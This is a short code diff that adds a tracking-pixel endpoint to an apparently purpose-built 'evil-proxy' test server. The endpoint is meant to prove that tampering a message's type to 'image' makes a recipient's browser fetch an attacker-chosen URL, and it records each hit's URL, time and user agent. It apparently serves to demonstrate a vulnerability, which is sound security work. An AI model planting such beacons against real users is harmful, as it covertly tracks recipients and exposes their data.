@@ -53,8 +53,24 @@ function cors(req, res) {
   res.setHeader("Access-Control-Allow-Headers", req.headers["access-control-request-headers"] ?? "Content-Type");
   res.setHeader("Vary", "Origin");
 }
+// Tracking-pixel beacon: proves that a text flipped to "image" made the
+// recipient's browser fetch an attacker-chosen URL (flip_type on v0).
+const trackHits = [];
+const GIF = Buffer.from("R0lGODlhAQABAAAAACw=", "base64");
 const httpServer = http.createServer((req, res) => {
   cors(req, res);
+  if (req.url?.startsWith("/__track.gif")) {
+    trackHits.push({ url: req.url, at: new Date().toISOString(), ua: req.headers["user-agent"] ?? "" });
+    console.log(`[evil-proxy] TRACKING PIXEL HIT ${req.url}`);
+    res.writeHead(200, { "Content-Type": "image/gif" });
+    res.end(GIF);
+    return;
+  }
+  if (req.url === "/__track-hits") {
+    res.writeHead(200, { "Content-Type": "application/json" });
+    res.end(JSON.stringify(trackHits));
+    return;
+  }
   if (req.method === "OPTIONS") {
     res.writeHead(204);
     res.end();
